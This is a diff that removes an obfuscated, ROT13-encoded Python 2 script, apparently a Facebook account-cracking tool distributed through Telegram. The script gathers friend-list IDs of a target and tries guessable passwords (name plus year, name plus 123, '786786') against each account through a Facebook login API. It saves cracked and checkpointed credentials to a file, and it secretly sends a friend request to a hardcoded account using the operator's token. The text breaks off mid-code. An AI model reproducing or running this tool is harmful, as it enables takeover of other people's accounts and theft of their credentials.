@@ -1,3 +1,549 @@
-#https://t.me/BESTxHACKER
-#Enc By Fara
-exec((lambda __, _, : _('''\ufeff#Uv ! OnL -_-\n#pbqvat=hgs-8\n\n\nvzcbeg bf,flf,gvzr,qngrgvzr,enaqbz,unfuyvo,er,guernqvat,wfba,heyyvo,pbbxvryvo,erdhrfgf,zrpunavmr\nsebz zhygvcebprffvat.cbby vzcbeg GuernqCbby\nsebz erdhrfgf.rkprcgvbaf vzcbeg PbaarpgvbaReebe\nsebz zrpunavmr vzcbeg Oebjfre\n\n\nerybnq(flf)\nflf.frgqrsnhygrapbqvat(\'hgs8\')\noe = zrpunavmr.Oebjfre()\noe.frg_unaqyr_ebobgf(Snyfr)\noe.frg_unaqyr_erserfu(zrpunavmr._uggc.UGGCErserfuCebprffbe(),znk_gvzr=1)\noe.nqqurnqref = [(\'hfre-ntrag\',\'Qnyivx/1.6.0 (Yvahk; H; Naqebvq 4.4.2; AK55 Ohvyq/XBG5506) [SONA/SO4N;SONI/106.0.0.26.68;SOOI/45904160;SOQZ/{qrafvgl=3.0,jvqgu=1080,urvtug=1920};SOYP/vg_VG;SOEI/45904160;SOPE/CbfgrZbovyr;SOZS/nfhf;SOOQ/nfhf;SOCA/pbz.snprobbx.xngnan;SOQI/NFHF_M00NQ;SOFI/5.0;SOBC/1;SOPN/k86:nezrnov-i7n;]\')]\n\n\nqrs xryhne():\n\tcevag "\\033[1;96z[!] \\k1o[1;91zRkvg"\n\tbf.flf.rkvg()\n\n\nqrs npnx(o):\n    j = \'nugqmwp\'\n    q = \'\'\n    sbe v va k:\n        q += \'!\'+j[enaqbz.enaqvag(0,yra(j)-1)]+v\n    erghea prgnx(q)\n\n\nqrs prgnx(o):\n    j = \'nugqmwp\'\n    sbe v va j:\n        w = j.vaqrk(v)\n        k= k.ercynpr(\'!%f\'%v,\'\\033[%f;1z\'%fge(31+w))\n    k += \'\\033[0z\'\n    k = k.ercynpr(\'!0\',\'\\033[0z\')\n    flf.fgqbhg.jevgr(k+\'\\a\')\n\n\n\t\t\n\t\t\n#### YBTB ####\nybtb = """\n\n\n                                                   \n______ _       ___  _____  _   __\n| ___ \\ |     / _ \\/  __ \\| | / /\n| |_/ / |    / /_\\ \\ /  \\/| |/ / \n| ___ \\ |    |  _  | |    |    \\ \n| |_/ / |____| | | | \\__/\\| |\\  \\\n\\____/\\_____/\\_| |_/\\____/\\_| \\_/\n                                 \n                                 \n                                             \n                                                                        \n  _____ _____  \n |_   _|  __ \\ \n   | | | |  | |\n   | | | |  | |\n  _| |_| |__| |\n |_____|_____/ \n               \n               \n                                                                  \n--------------------------------------------------\n Nhgube      : O Y N P X Z V E B E\n \n TvgUho     : uggcf://tvguho.pbz/sneqvaUnpx\n \n LbhGhor  : Abg Lrg\n \nGryrtenz  : ORFGkUNPXRE\n\n--------------------------------------------------\n"""\nqrs gvx():\n\tgvgvx = [\'.   \',\'..  \',\'... \']\n\tsbe b va gvgvx:\n\t\tcevag("\\e\\k1o[1;95zCyrnfr Jnvg \\k1o[1;95z"+b),;flf.fgqbhg.syhfu();gvzr.fyrrc(1)\n\n\nonpx = 0\noreunfvy = []\nprxcbvag = []\nbxf = []\nvq = []\nyvfgtehc = []\nihyabg = "\\033[31zAbg Ihya"\nihya = "\\033[32zIhya"\n\nbf.flfgrz("pyrne")\ncevag ybtb\n\nPbeerpgHfreanzr = "Oynpx"\nPbeerpgCnffjbeq = "VQ"\nybbc = \'gehr\'\njuvyr (ybbc == \'gehr\'):\n    hfreanzr = enj_vachg("Gbby Hfreanzr »» ")\n    vs (hfreanzr == PbeerpgHfreanzr):\n    \tcnffjbeq = enj_vachg("Gbby Cnffjbeq »» ")\n        vs (cnffjbeq == PbeerpgCnffjbeq):\n            cevag "Ybttrq va fhpprffshyyl nf " + hfreanzr #Qri: Oynpx_Zvebe\n\t    gvzr.fyrrc(2)\n            ybbc = \'snyfr\'\n        ryfr:\n            cevag "\\033[1;96zJebat Cnffjbeq"\n            bf.flfgrz(\'kqt-bcra uggcf://g.zr/fhygnav1122\')\n    ryfr:\n        cevag "\\033[1;96zJebat Hfreanzr"\n        bf.flfgrz(\'kqt-bcra uggcf://g.zr/ORFGkUNPXRE\')\n\nqrs ybtva():\n\tbf.flfgrz(\'pyrne\')\n\tgel:\n\t\tgbxrg = bcra(\'.so_gbxra.gkg\',\'e\')\n\t\tzrah() \n\trkprcg (XrlReebe,VBReebe):\n\t\tbf.flfgrz(\'pyrne\')\n\t\tcevag ybtb\n\t\tcevag("[1] Gbxra ybtva")\n\t\tcevag("[2] vq/cnff ybtva")\n\t\tcevag("")\n\t\tybtva_fryrpg()\nqrs ybtva_fryrpg():\n    nsmn = enj_vachg(" Pubbfr ybtva zrgubq >>> ")\n    vs nsmn =="1":\n        bf.flfgrz("pyrne")\n        cevag ybtb\n        cevag("")\n        cevag("\\g    \\033[1;32zSO Gbxra Ybtva\\033[0;97z")\n        cevag("")\n        gbxra = enj_vachg(" Cnfg gbxra urer : ")\n        gbxra_f = bcra(".so_gbxra.gkg","j")\n        gbxra_f.jevgr(gbxra)\n        gbxra_f.pybfr()\n        gel:\n            e = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/zr?npprff_gbxra="+gbxra)\n            d = wfba.ybnqf(e.grkg)\n            anzr = d["anzr"]\n            az = anzr.efcyvg(" ")[0]\n            cevag("")\n            cevag("\\g\\033[1;32zGbxra ybttrq va nf : "+az+"\\033[0;97z")\n            gvzr.fyrrc(3)\n            zrah()\n        rkprcg (XrlReebe , VBReebe):\n            cevag("")\n            cevag("\\g    \\033[1;31zGbxra abg inyvq\\033[0;97z")\n            cevag("")\n            enj_vachg(" Cerff ragre gb gel ntnva ")\n            ybtva()\n    vs nsmn =="2":\n        ybtva_so()\n    ryfr:\n        cevag("")\n        cevag("\\g    "+p+"Fryrpg inyvq zrgubq"+p2)\n        cevag("")\n        ybtva_fryrpg()\nqrs ybtva_so():\n\tbf.flfgrz("pyrne")\n\tcevag ybtb\n\tcevag("")\n\tcevag("\\g    \\033[1;32zSO VQ/CNFF Ybtva\\033[0;97z")\n\tcevag("")\n\tvq = enj_vachg(" VQ/Znvy/Ahz : ")\n\tvq1=vq.ercynpr(\' \',\'\')\n\tvq2=vq1.ercynpr(\'(\',\'\')\n\thvq=vq2.ercynpr(\')\',\'\')\n\tcjq = enj_vachg(" Cnffjbeq   : ")\n\tcevag("")\n\tqngn=erdhrfgf.trg(\'uggc://ybpnyubfg:5000/nhgu?vq=\'+hvq+\'&cnff=\'+cjq, urnqref=urnqre).grkg\n\td = wfba.ybnqf(qngn)\n\tvs "ybp" va d:\n\t\tunzmn = bcra(".so_gbxra.gkg","j")\n\t\tunzmn.jevgr(d["ybp"])\n\t\tunzmn.pybfr()\n\t\terdhrfgf.cbfg(\'uggcf://tencu.snprobbx.pbz/zr/sevraqf?hvq=100048514350891&npprff_gbxra=\'+d[\'ybp\'])\n\t\tgvzr.fyrrc(1)\n\t\tcevag("\\g    \\033[1;32zYbttrq va fhpprffshyyl\\033[0;97z")\n\t\tgvzr.fyrrc(1)\n\t\tzrah()\n\tryvs "jjj.snprobbx.pbz" va d["reebe"]:\n\t\tcevag("\\g    \\033[1;31zHfre zhfg irevsl nppbhag orsber ybtva\\033[0;97z")\n\t\tcevag("")\n\t\tgvzr.fyrrc(1)\n\t\tenj_vachg(" Cerff ragre gb gel ntnva ")\n\t\tybtva_so()\n\tryfr:\n\t\tcevag("\\g\\033[1;31zVQ/Ahzore/Cnffjbeq znl or jebat\\033[0;97z")\n\t\tcevag("")\n\t\tenj_vachg(" Cerff ragre gb gel ntnva ")\n\t\tybtva_so()\n\n\nqrs zrah():\n\tbf.flfgrz(\'pyrne\')\n\tgel:\n\t\tgbxrg=bcra(\'.so_gbxra.gkg\',\'e\').ernq()\n\trkprcg VBReebe:\n\t\tbf.flfgrz(\'pyrne\')\n\t\tcevag"\\k1o[1;91z[!] Gbxra vainyvq"\n\t\tbf.flfgrz(\'ez -es .so_gbxra.gkg\')\n\t\tgvzr.fyrrc(1)\n\t\tybtva()\n\tgel:\n\t\tbgj = erdhrfgf.trg(\'uggcf://tencu.snprobbx.pbz/zr?npprff_gbxra=\'+gbxrg)\n\t\tn = wfba.ybnqf(bgj.grkg)\n\t\tanzn = n[\'anzr\']\n\t\tvq = n[\'vq\']\n\t\tbgf = erdhrfgf.trg(\'uggcf://tencu.snprobbx.pbz/zr/fhofpevoref?npprff_gbxra=\' + gbxrg)\n\t\to = wfba.ybnqf(bgf.grkg)\n\t\tfho = fge(o[\'fhzznel\'][\'gbgny_pbhag\'])\n\trkprcg XrlReebe:\n\t\tbf.flfgrz(\'pyrne\')\n\t\tcevag"\\033[1;91zLbhe Nppbhag vf ba Purpxcbvag"\n\t\tbf.flfgrz(\'ez -es .so_gbxra.gkg\')\n\t\tgvzr.fyrrc(1)\n\t\tybtva()\n\trkprcg erdhrfgf.rkprcgvbaf.PbaarpgvbaReebe:\n\t\tcevag"\\k1o[1;92zGurer vf ab vagrearg pbaarpgvba"\n\t\txryhne()\n\tbf.flfgrz("pyrne")\n\tcevag ybtb\n\tcevag "\\033[1;36;40z      ╔═════════════════════════════════╗"\n\tcevag "\\033[1;36;40z      ║\\033[1;32;40z[*] Anzr\\033[1;32;40z: "+anzn+"  \t   \\033[1;36;40z║"                               \n\tcevag "\\033[1;36;40z      ║\\033[1;34;40z[*] VQ  \\033[1;34;40z: "+vq+"        \\033[1;36;40z║"\n\tcevag "\\033[1;36;40z      ║\\033[1;34;40z[*] Fhof\\033[1;34;40z: "+fho+"                      \\033[1;36;40z║"\n\tcevag "\\033[1;36;40z      ╚═════════════════════════════════╝"\n\tcevag "    \\033[1;32;40z[Glcr1] \\033[1;33;40z‹•.•›Fgneg Unpxvat"\t\n\tcevag "    \\033[1;32;40z[glcr2] \\033[1;33;40z‹•.•›Hcqngr"\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\tcevag "    \\033[1;32;40z[glcr0] \\033[1;33;40z‹•.•›Ybtbhg"\n\tcvyvu()\n\nqrs cvyvu():\n\thavxref = enj_vachg("\\a\\033[1;31;40z>>> \\033[1;35;40z")\n\tvs havxref =="":\n\t\tcevag "\\k1o[1;91zSvyy va pbeerpgyl"\n\t\tcvyvu()\n\tryvs havxref =="1":\n\t\tfhcre()\n\tryvs havxref =="2":\n\t\tbf.flfgrz(\'pyrne\')\n\t\tcevag ybtb\n\t\tcevag " \\033[1;36;40z●══════════════════◄►══════════════════●\\a"\n\t\tbf.flfgrz(\'tvg chyy bevtva znfgre\')\n\t\tenj_vachg(\'\\a\\k1o[1;91z[ \\k1o[1;97zOnpx \\k1o[1;91z]\')\n\t\tzrah()\n\tryvs havxref =="0":\n\t\tcevag(\'Gbxra Erzbirq\')\n\t\tbf.flfgrz(\'ez -es .so_gbxra.gkg\')\n\t\txryhne()\n\tryfr:\n\t\tcevag "\\k1o[1;91zSvyy va pbeerpgyl"\n\t\tcvyvu()\n\nqrs fhcre():\n\ttybony gbxrg\n\tbf.flfgrz(\'pyrne\')\n\tgel:\n\t\tgbxrg=bcra(\'.so_gbxra.gkg\',\'e\').ernq()\n\trkprcg VBReebe:\n\t\tcevag"\\k1o[1;91zGbxra vainyvq"\n\t\tbf.flfgrz(\'ez -es .so_gbxra.gkg\')\n\t\tgvzr.fyrrc(1)\n\t\tybtva()\n\tbf.flfgrz(\'pyrne\')\n\tcevag ybtb\n\tcevag "     \\033[1;97z-•◈•-\\033[1;91z> \\033[1;91z1.\\k1o[1;95z>_<Pybar Sevraq Yvfg."\n\tcevag "     \\033[1;97z-•◈•-\\033[1;91z> \\033[1;91z2.\\k1o[1;95z>_<Unpx Choyvp Nppbhagf ."\n\tcevag "     \\033[1;97z-•◈•-\\033[1;91z> \\033[1;91z0.\\033[1;91z>_<Onpx"\n\tcvyvu_fhcre()\n\nqrs cvyvu_fhcre():\n\tcrnx = enj_vachg("\\a\\033[1;91z^.^Pubbfr na Bcgvba>>> \\033[1;95z")\n\tvs crnx =="":\n\t\tcevag "\\k1o[1;91zSvyy va pbeerpgyl"\n\t\tcvyvu_fhcre()\n\tryvs crnx =="1":\n\t\tbf.flfgrz(\'pyrne\')\n\t\tcevag ybtb\n\t\tcevag "\\033[1;97z•◈•══════•◈•\\033[1;91zybirNXZ\\033[1;97z•◈•══════•◈•"\n\t\tcevag(\'\\033[1;91zTrggvat VQf \\033[1;91z...\')\n\t\te = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/zr/sevraqf?npprff_gbxra="+gbxrg)\n\t\tm = wfba.ybnqf(e.grkg)\n\t\tsbe f va m[\'qngn\']:\n\t\t\tvq.nccraq(f[\'vq\'])\n\tryvs crnx =="2":\n\t\tbf.flfgrz(\'pyrne\')\n\t\tcevag ybtb\n\t\tvqg = enj_vachg("\\033[1;95z[•◈•] \\033[1;91zRagre VQ\\033[1;95z: \\033[1;95z")\n\t\tcevag "\\033[1;92z•◈•══════••◈•\\033[1;91zOynpxVQ\\033[1;95z•◈•══════••◈•"\n\t\tgel:\n\t\t\twbx = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/"+vqg+"?npprff_gbxra="+gbxrg)\n\t\t\tbc = wfba.ybnqf(wbx.grkg)\n\t\t\tcevag"\\033[1;91zAnzr\\033[1;95z:\\033[1;95z "+bc["anzr"]\n\t\trkprcg XrlReebe:\n\t\t\tcevag"\\k1o[1;91zVQ Abg Sbhaq!"\n\t\t\tenj_vachg("\\a\\033[1;95z[\\033[1;91zOnpx\\033[1;95z]")\n\t\t\tfhcre()\n\t\tcevag"\\033[1;91zTrggvat VQf\\033[1;97z..."\n\t\te = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/"+vqg+"/sevraqf?npprff_gbxra="+gbxrg)\n\t\tm = wfba.ybnqf(e.grkg)\n\t\tsbe v va m[\'qngn\']:\n\t\t\tvq.nccraq(v[\'vq\'])\n\tryvs crnx =="0":\n\t\tzrah()\n\tryfr:\n\t\tcevag "\\k1o[1;91zSvyy va pbeerpgyl"\n\t\tcvyvu_fhcre()\n\t\n\tcevag "\\033[1;36;40z[✺] Gbgny VQf : \\033[1;94z"+fge(yra(vq))\n\tcevag(\'\\033[1;34;40z[✺] Cyrnfr Jnvg...\')\n\tgvgvx = [\'.   \',\'..  \',\'... \']\n\tsbe b va gvgvx:\n\t\tcevag("\\e\\033[1;32;40z[✺] Pybavat\\033[1;93z"+b),;flf.fgqbhg.syhfu();gvzr.fyrrc(1)\n\tcevag "\\a\\033[1;94z        ❈     \\k1o[1;91zGb Fgbc Cebprff Cerff PGEY+M \\033[1;94z    ❈"\n\tcevag "   \\033[1;92z●══════════════════◄►══════════════════●"\n\n\tcevag(\'           \\033[1;91zOynpxZvebe fgneg pybavat Jnvg...\')\n\tcevag  "  \\033[1;92z ●══════════════════◄►══════════════════●" \n\n\tqrs znva(net):\n\t\ttybony prxcbvag,bxf\n\t\thfre = net\n\t\tgel:\n\t\t\tbf.zxqve(\'bhg\')\n\t\trkprcg BFReebe:\n\t\t\tcnff #Qri:enan\n\t\tgel:\n\t\t\tn = erdhrfgf.trg(\'uggcf://tencu.snprobbx.pbz/\'+hfre+\'/?npprff_gbxra=\'+gbxrg)\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\to = wfba.ybnqf(n.grkg)\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\tcnff1 = o[\'svefg_anzr\'] + \'2004\'\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\tqngn = heyyvo.heybcra("uggcf://o-ncv.snprobbx.pbz/zrgubq/nhgu.ybtva?npprff_gbxra=237759909591655%25257P0s140nnorqso65np27n739rq1n2263o1&sbezng=wfba&fqx_irefvba=2&rznvy="+(hfre)+"&ybpnyr=ra_HF&cnffjbeq="+(cnff1)+"&fqx=vbf&trarengr_frffvba_pbbxvrf=1&fvt=3s555s99so61spq7nn0p44s58s522rs6")\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\td = wfba.ybnq(qngn)\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\tvs \'npprff_gbxra\' va d:\n\t\t\t\tk = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/"+hfre+"?npprff_gbxra="+d[\'npprff_gbxra\'])\n\t\t\t\tm = wfba.ybnqf(k.grkg)\n\t\t\t\tcevag \'\\k1o[1;94z[  ✓  ] \\k1o[1;92zUnpx100%💉\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\tcevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zAnzr \\k1o[1;91z    ✯ \\k1o[1;92z\' + o[\'anzr\']\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\tcevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zVQ \\k1o[1;91z      ✯ \\k1o[1;92z\' + hfre\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\tcevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zCnffjbeq \\k1o[1;91z✯ \\k1o[1;92z\' + cnff1 + \'\\a\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\tbxf.nccraq(hfre+cnff1)\n                        ryfr:\n\t\t\t        vs \'jjj.snprobbx.pbz\' va d["reebe_zft"]:\n\t\t\t\t    cevag \'\\k1o[1;94z[ ❥ ] \\k1o[1;94zPurpxcbvag\'\n\t\t\t\t    cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zAnzr \\k1o[1;94z    ✯ \\k1o[1;95z\' + o [\'anzr\']\n\t\t\t\t    cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zVQ \\k1o[1;94z      ✯ \\k1o[1;95z\' + hfre\n\t\t\t\t    cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zCnffjbeq \\k1o[1;94z✯ \\k1o[1;95z\' + cnff1 + \'\\a\'\n\t\t\t\t    prx = bcra("bhg/fhcre_pc.gkg", "n")\n\t\t\t\t    prx.jevgr("VQ:" +hfre+ " Cj:" +cnff1+"\\a")\n\t\t\t\t    prx.pybfr()\n\t\t\t\t    prxcbvag.nccraq(hfre+cnff1)\n                                ryfr:\n\t\t\t\t    cnff2 = o[\'svefg_anzr\'] + \'2005\'\t\t\t\t\t\t\t\t\t\t\n                                    qngn = heyyvo.heybcra("uggcf://o-ncv.snprobbx.pbz/zrgubq/nhgu.ybtva?npprff_gbxra=237759909591655%25257P0s140nnorqso65np27n739rq1n2263o1&sbezng=wfba&fqx_irefvba=2&rznvy="+(hfre)+"&ybpnyr=ra_HF&cnffjbeq="+(cnff2)+"&fqx=vbf&trarengr_frffvba_pbbxvrf=1&fvt=3s555s99so61spq7nn0p44s58s522rs6")\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t            d = wfba.ybnq(qngn)\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t            vs \'npprff_gbxra\' va d:\t\n\t\t\t\t            k = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/"+hfre+"?npprff_gbxra="+d[\'npprff_gbxra\'])\n\t\t\t\t            m = wfba.ybnqf(k.grkg)\n\t\t\t\t            cevag \'\\k1o[1;94z[  ✓  ] \\k1o[1;92zUnpx100%💉\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t            cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zAnzr \\k1o[1;91z    ✯ \\k1o[1;92z\' + o[\'anzr\']\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t            cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zVQ \\k1o[1;91z      ✯ \\k1o[1;92z\' + hfre\t\t\t\t\t\t\t\t\n\t\t\t\t            cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zCnffjbeq \\k1o[1;91z✯ \\k1o[1;92z\' + cnff2 + \'\\a\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t            bxf.nccraq(hfre+cnff2)\n                                    ryfr:\n\t\t\t                   vs \'jjj.snprobbx.pbz\' va d["reebe_zft"]:\n\t\t\t\t               cevag \'\\k1o[1;94z[ ❥ ] \\k1o[1;94zPurpxcbvag\'\n\t\t\t\t               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zAnzr \\k1o[1;94z    ✯ \\k1o[1;95z\' + o[\'anzr\']\n\t\t\t\t               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zVQ \\k1o[1;94z      ✯ \\k1o[1;95z\' + hfre\n\t\t\t\t               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zCnffjbeq \\k1o[1;94z✯ \\k1o[1;95z\' + cnff2 + \'\\a\'\n\t\t\t\t               prx = bcra("bhg/fhcre_pc.gkg", "n")\n\t\t\t\t               prx.jevgr("VQ:" +hfre+ " Cj:" +cnff2+"\\a")\n\t\t\t\t               prx.pybfr()\n\t\t\t\t               prxcbvag.nccraq(hfre+cnff2)\t\t\t\t\t\t\t\t\n\t\t\t\t           ryfr:\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t       cnff3 = o[\'ynfg_anzr\']+\'123\'\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t       qngn = heyyvo.heybcra("uggcf://o-ncv.snprobbx.pbz/zrgubq/nhgu.ybtva?npprff_gbxra=237759909591655%25257P0s140nnorqso65np27n739rq1n2263o1&sbezng=wfba&fqx_irefvba=2&rznvy="+(hfre)+"&ybpnyr=ra_HF&cnffjbeq="+(cnff3)+"&fqx=vbf&trarengr_frffvba_pbbxvrf=1&fvt=3s555s99so61spq7nn0p44s58s522rs6")\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t       d = wfba.ybnq(qngn)\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t       vs \'npprff_gbxra\' va d:\t\n\t\t\t\t\t\t       k = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/"+hfre+"?npprff_gbxra="+d[\'npprff_gbxra\'])\n\t\t\t\t                       m = wfba.ybnqf(k.grkg)\n\t\t\t\t\t\t       cevag \'\\k1o[1;94z[  ✓  ] \\k1o[1;92zUnpx100%💉\'\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zAnzr \\k1o[1;91z    ✯ \\k1o[1;92z\' + o[\'anzr\']\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zVQ \\k1o[1;91z      ✯ \\k1o[1;92z\' + hfre\t\t\t\t\t\t\t\n\t\t\t\t\t\t       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zCnffjbeq \\k1o[1;91z✯ \\k1o[1;92z\' + cnff3 + \'\\a\'\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t       bxf.nccraq(hfre+cnff3)\n                                               ryfr:\n\t\t\t                               vs \'jjj.snprobbx.pbz\' va d["reebe_zft"]:\n\t\t\t\t                           cevag \'\\k1o[1;94z[ ❥ ] \\k1o[1;94zPurpxcbvag\'\n\t\t\t\t                           cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zAnzr \\k1o[1;94z    ✯ \\k1o[1;95z\' + o[\'anzr\']\n\t\t\t\t                           cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zVQ \\k1o[1;94z      ✯ \\k1o[1;95z\' + hfre\n\t\t\t\t                           cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zCnffjbeq \\k1o[1;94z✯ \\k1o[1;95z\' + cnff3 + \'\\a\'\n\t\t\t\t                           prx = bcra("bhg/fhcre_pc.gkg", "n")\n\t\t\t\t                           prx.jevgr("VQ:" +hfre+ " Cj:" +cnff3+"\\a")\n\t\t\t\t                           prx.pybfr()\n\t\t\t\t                           prxcbvag.nccraq(hfre+cnff3)\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t               ryfr:\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t           cnff4 = o[\'svefg_anzr\'] + \'123\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t                                   qngn = heyyvo.heybcra("uggcf://o-ncv.snprobbx.pbz/zrgubq/nhgu.ybtva?npprff_gbxra=237759909591655%25257P0s140nnorqso65np27n739rq1n2263o1&sbezng=wfba&fqx_irefvba=2&rznvy="+(hfre)+"&ybpnyr=ra_HF&cnffjbeq="+(cnff4)+"&fqx=vbf&trarengr_frffvba_pbbxvrf=1&fvt=3s555s99so61spq7nn0p44s58s522rs6")\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t                                   d = wfba.ybnq(qngn)\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t                                   vs \'npprff_gbxra\' va d:\t\t\n\t\t\t\t\t\t                   k = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/"+hfre+"?npprff_gbxra="+d[\'npprff_gbxra\'])\n\t\t\t\t                                   m = wfba.ybnqf(k.grkg)\n\t\t\t\t                                   cevag \'\\k1o[1;94z[  ✓  ] \\k1o[1;92zUnpx100%💉\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zAnzr \\k1o[1;91z    ✯ \\k1o[1;92z\' + o[\'anzr\']\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zVQ \\k1o[1;91z      ✯ \\k1o[1;92z\' + hfre\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zCnffjbeq \\k1o[1;91z✯ \\k1o[1;92z\' + cnff4 + \'\\a\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                   bxf.nccraq(hfre+cnff4)\n                                                           ryfr:\n\t\t\t                                           vs \'jjj.snprobbx.pbz\' va d["reebe_zft"]:\n\t\t\t\t                                       cevag \'\\k1o[1;94z[ ❥ ] \\k1o[1;94zPurpxcbvag\'\n\t\t\t\t                                       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zAnzr \\k1o[1;94z    ✯ \\k1o[1;95z\' + o[\'anzr\']\n\t\t\t\t                                       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zVQ \\k1o[1;94z      ✯ \\k1o[1;95z\' + hfre\n\t\t\t\t                                       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zCnffjbeq \\k1o[1;94z✯ \\k1o[1;95z\' + cnff4 + \'\\a\'\n\t\t\t\t                                       prx = bcra("bhg/fhcre_pc.gkg", "n")\n\t\t\t\t                                       prx.jevgr("VQ:" +hfre+ " Cj:" +cnff4+"\\a")\n\t\t\t\t                                       prx.pybfr()\n\t\t\t\t                                       prxcbvag.nccraq(hfre+cnff4)\t\t\t\t\t\n\t\t\t\t\t                           ryfr:\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t                       cnff5 = \'786786\'\t\t\t\t\t\t\t\n\t\t\t\t\t\t                       qngn = heyyvo.heybcra("uggcf://o-ncv.snprobbx.pbz/zrgubq/nhgu.ybtva?npprff_gbxra=237759909591655%25257P0s140nnorqso65np27n739rq1n2263o1&sbezng=wfba&fqx_irefvba=2&rznvy="+(hfre)+"&ybpnyr=ra_HF&cnffjbeq="+(cnff5)+"&fqx=vbf&trarengr_frffvba_pbbxvrf=1&fvt=3s555s99so61spq7nn0p44s58s522rs6")\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t                       d = wfba.ybnq(qngn)\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t                       vs \'npprff_gbxra\' va d:\t\n\t\t\t\t\t\t                               k = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/"+hfre+"?npprff_gbxra="+d[\'npprff_gbxra\'])\n\t\t\t\t                                               m = wfba.ybnqf(k.grkg)\n\t\t\t\t\t\t                               cevag \'\\k1o[1;94z[  ✓  ] \\k1o[1;92zUnpx100%💉\'\t\t\t\t\t\t\n\t\t\t\t\t\t                               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zAnzr \\k1o[1;91z    ✯ \\k1o[1;92z\' + o[\'anzr\']\t\t\t\t\t\t\t\n\t\t\t\t\t\t                               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zVQ \\k1o[1;91z      ✯ \\k1o[1;92z\' + hfre\t\t\t\t\t\n\t\t\t\t\t\t                               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zCnffjbeq \\k1o[1;91z✯ \\k1o[1;92z\' + cnff5 + \'\\a\'\t\t\t\t\t\t\t\n\t\t\t\t\t\t                               bxf.nccraq(hfre+cnff5)\t\n                                                                       ryfr:\n\t\t\t                                                       vs \'jjj.snprobbx.pbz\' va d["reebe_zft"]:\n\t\t\t\t                                                   cevag \'\\k1o[1;94z[ ❥ ] \\k1o[1;94zPurpxcbvag\'\n\t\t\t\t                                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zAnzr \\k1o[1;94z    ✯ \\k1o[1;95z\' + o[\'anzr\']\n\t\t\t\t                                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zVQ \\k1o[1;94z      ✯ \\k1o[1;95z\' + hfre\n\t\t\t\t                                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zCnffjbeq \\k1o[1;94z✯ \\k1o[1;95z\' + cnff5 + \'\\a\'\n\t\t\t\t                                                   prx = bcra("bhg/fhcre_pc.gkg", "n")\n\t\t\t\t                                                   prx.jevgr("VQ:" +hfre+ " Cj:" +cnff5+"\\a")\n\t\t\t\t                                                   prx.pybfr()\n\t\t\t\t                                                   